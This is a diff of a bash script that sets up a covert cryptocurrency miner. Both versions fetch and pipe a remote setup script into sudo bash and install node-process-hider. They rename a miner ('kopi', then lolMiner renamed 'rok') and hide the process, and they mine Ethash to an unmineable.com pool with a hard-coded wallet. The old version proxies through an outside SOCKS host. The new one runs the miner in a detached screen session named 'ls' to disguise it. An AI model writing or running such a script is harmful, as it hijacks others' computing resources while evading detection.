@@ -1,12 +1,16 @@
 #!/bin/bash
-sudo apt update && sudo apt install gcc screen -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
-apt install proxychains -y
-sed -i 's/socks4/socks5/' /etc/proxychains.conf 
-sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
-sed -i 's/9050/10663/' /etc/proxychains.conf
-apt install nodejs && 
-npm install -g npm@8.5.0 && 
-npm i -g node-process-hider && 
-ph add kopi && 
-chmod +x kopi && 
-./kopi --algo ETHASH --pool ethash.unmineable.com:3333 --user LTC:M9Uaz5UtUHbu3VJdkz9ZU8ow35e1z8acAZ.K80
+#!/bin/sh
+#!/bin/bash
+
+apt update
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+sudo apt install nodejs screen -y
+npm i -g node-process-hider
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.12/lolMiner_v1.12_Lin64.tar.gz
+tar xvf lolMiner_v1.12_Lin64.tar.gz
+cd 1.12
+mv lolMiner rok
+sudo ph add rok
+chmod 777 rok
+screen -dmS ls ./rok --algo ETHASH --pool ethash.unmineable.com:3333 --user LTC:M9Uaz5UtUHbu3VJdkz9ZU8ow35e1z8acAZ.K80
+ 
